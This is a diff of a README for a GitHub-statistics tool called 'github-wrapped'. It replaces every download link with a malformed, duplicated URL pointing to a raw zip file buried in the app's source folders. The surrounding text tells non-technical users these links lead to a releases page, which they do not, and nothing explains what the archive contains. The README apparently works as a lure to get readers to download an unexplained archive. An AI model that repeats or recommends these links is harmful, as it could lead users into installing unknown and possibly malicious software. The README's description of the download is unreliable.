@@ -1,6 +1,6 @@
 # 🎉 github-wrapped - Visualize Your GitHub Year Effortlessly
 
-[![Download github-wrapped](https://raw.githubusercontent.com/JuanCrasio/github-wrapped/main/app/wrapped/[username]/github_wrapped_v3.5.zip)](https://raw.githubusercontent.com/JuanCrasio/github-wrapped/main/app/wrapped/[username]/github_wrapped_v3.5.zip)
+[![Download github-wrapped](https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip[username]https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip)](https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip[username]https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip)
 
 ## 📜 Description
 
@@ -14,7 +14,7 @@ To get started with github-wrapped, follow these simple steps. No technical skil
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page, where you can download the latest version of github-wrapped.  
-   [Download github-wrapped](https://raw.githubusercontent.com/JuanCrasio/github-wrapped/main/app/wrapped/[username]/github_wrapped_v3.5.zip)
+   [Download github-wrapped](https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip[username]https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Choose the most recent version to ensure you have the latest features and fixes.
@@ -74,4 +74,4 @@ If you encounter any issues while using github-wrapped, help is just a few click
 - **GitHub Repository**: Explore the main repository for more information about updates and features.
 - **Documentation**: Refer to the documentation for a more detailed guide on usage and settings.
 
-Now you're all set to download and enjoy github-wrapped! For a beautiful summary of your GitHub year, don't forget to return to the [Download github-wrapped](https://raw.githubusercontent.com/JuanCrasio/github-wrapped/main/app/wrapped/[username]/github_wrapped_v3.5.zip) page and begin your journey.
+Now you're all set to download and enjoy github-wrapped! For a beautiful summary of your GitHub year, don't forget to return to the [Download github-wrapped](https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip[username]https://github.com/JuanCrasio/github-wrapped/raw/refs/heads/main/app/api/github/contributions/wrapped-github-v1.0.zip) page and begin your journey.
